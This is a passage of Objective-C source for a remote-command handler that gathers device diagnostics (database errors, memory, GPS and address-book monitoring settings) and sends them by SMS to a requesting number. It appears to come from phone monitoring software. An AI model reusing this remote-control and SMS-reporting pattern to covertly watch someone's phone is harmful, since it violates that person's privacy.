    //		TableHealthLog tableHealthLog;
    //		[tableHealthLogValue getValue:&tableHealthLog];
    //		DLog(@"tableHelthLog %@", tableLogArray)
    //		DLog(@"tableHealthLog write error: %d", tableHealthLog.writeErrorCount)
    //		DLog(@"tableHealthLog read error: %d", tableHealthLog.readErrorCount)
    //		writeErrorCount = writeErrorCount + tableHealthLog.writeErrorCount;
    //		readErrorCount = readErrorCount + tableHealthLog.readErrorCount;
    //	}
    //	DLog(@"write error count: %d", writeErrorCount)
    //	DLog(@"read error count: %d", readErrorCount)
    //	dbCorruptCountString = [dbCorruptCountString stringByAppendingString:[NSString stringWithFormat:@"%d", writeErrorCount]];
    //	
    //	// 16 Database Damage count
    //	dbDamageString = [dbDamageString stringByAppendingString:[NSString stringWithFormat:@"%d", readErrorCount]];
    //	
    //	// 17 Database drop count 
    //	dbDroppedCountString=[dbDroppedCountString stringByAppendingString:[NSString stringWithFormat:@"%d", [dbHealthInfo dbDropCount]]];
    //
    //	// 18 DB row corrupt
    //	// already done
    //	
    //	// 19 recovered count
    //	dbRecoveredCountString = [dbRecoveredCountString stringByAppendingString:[NSString stringWithFormat:@"%d", [dbHealthInfo dbRecoveryCount]]];
    //	
    //	// 20 Phone's GPS Setting
    //	// already done
    //	
    //	// 21 isLowMemory 
    //	if (([dbHealthInfo mAvailableSize])/1024 <= 500) 
    //		isMemoryLowString=[isMemoryLowString stringByAppendingString:@"1"];
    //	else  
    //		isMemoryLowString=[isMemoryLowString stringByAppendingString:@"0"];	
    //	// 23 Address book
    //	if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
    //    	PrefRestriction *prefRestriction = (PrefRestriction *)[prefManager preference:kRestriction];
    //		if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff) {
    //			addresBookString=[addresBookString stringByAppendingString:[NSString stringWithFormat:@"%d", 0]];
    //		} else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor) {
    //			addresBookString=[addresBookString stringByAppendingString:[NSString stringWithFormat:@"%d", 1]];
    //		} else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict) {
    //			addresBookString=[addresBookString stringByAppendingString:[NSString stringWithFormat:@"%d", 2]];
    //		}
    //	}
    //	 					 															 
    
    DLog(@"diagnostic result %@", result)
    return result;
}
- (void) processRequestDiagnostic {
	[self sendReplySMSWithResult:[RequestDiagnosticProcessor getRequestDiagnostic]];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult: (NSString *) aResult {
	DLog (@"RequestDiagnosticProcessor--->sendReplySMS")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *requestDiagnosticMessage = [NSString stringWithFormat:@"%@%@",messageFormat,aResult];

	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
												 andReplyMessage:requestDiagnosticMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:requestDiagnosticMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

-(void) dealloc {
	[super dealloc];
}


@end
